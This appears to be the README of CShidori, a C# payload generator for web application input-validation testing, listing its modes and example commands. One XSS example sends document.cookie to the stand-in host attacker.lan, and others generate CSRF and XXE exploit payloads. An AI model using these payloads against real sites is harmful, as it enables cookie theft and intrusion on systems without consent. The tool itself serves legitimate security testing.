# CShidori

A C# "Thousand Birds" Payloads Generator

![](Intro.png)

## Disclaimer

Usage of all tools on this site for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site. This tools is provided "as is" without warranty of any kind.

## References

* OWASP Web Application Security Testing Guide: [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)

* Taisen: [Website](https://taisen.fr)

## Supported modes and payloads

### Modes 
* Mutation
* XSS
* JSON
* XML
* GET
* CSRF
* XXE
* MSTest
* Encoding
* List Generation

### Payloads

* Chars (default)
* Strings (default)
* DotNet
* Java
* Xss

## Usage and examples

### Mutation

generate 5 mutation (chars and bitflip) for the value "test" :

```powershell
.\CShidori.exe -m mut -o 5 -p test -d Chars
```

### XSS / Injections

wrapp xss command to test multiples injections:

```powershell
.\CShidori.exe -m xss -p 'document.location=\"https://attacker.lan?c=\"+document.cookie'
```

### JSON

Inject java and general payloads in all parameters of a Json request

```powershell
.\CShidori.exe -m json -p ..\testing\test.json -d Java,Strings
```

### XML

Inject .NET payloads in all parameters of an XML request

```powershell
.\CShidori.exe -m xml -p ..\testing\exemple.xml -d DotNet
```

### GET

Inject default payloads in all GET parameters and tests parameters polution

```powershell
.\CShidori.exe -m get -p "?bar=foo&foo=bar"
```

### CSRF

Generate get and post CSRF exploits

```powershell
.\CShidori.exe -m csrf -o get -p http://target.lan -i "name1=value1&name2=value2"
.\CShidori.exe -m csrf -o post -p http://target.lan -i "name1=value1&name2=value2"

```

### XXE

Generate XXE payload

```powershell
.\CShidori.exe -m xxe
```
### MSTEST

Generate Test for Microsoft.VisualStudio.TestTools.UnitTesting (Beta)

```powershell
.\CShidori.exe -m mst -p 'function( \"value1\", 2, FUZZ)' -i FUZZ
```

### Encode

Encode your payload

```powershell
.\CShidori.exe -m enc -p "<script>alert(1)</script>"
```

### List Generation

Generate a payload list

```powershell
.\CShidori.exe -m gen -d Chars,Java
```

## Miscellaneous

### SOAP & XSD

Removed since you can perform it from Visual Studio:
- Merge all XSD files in WSDL file
- Right click on the project and select "Add Service Reference" -> "WCF" -> "enter localPath"
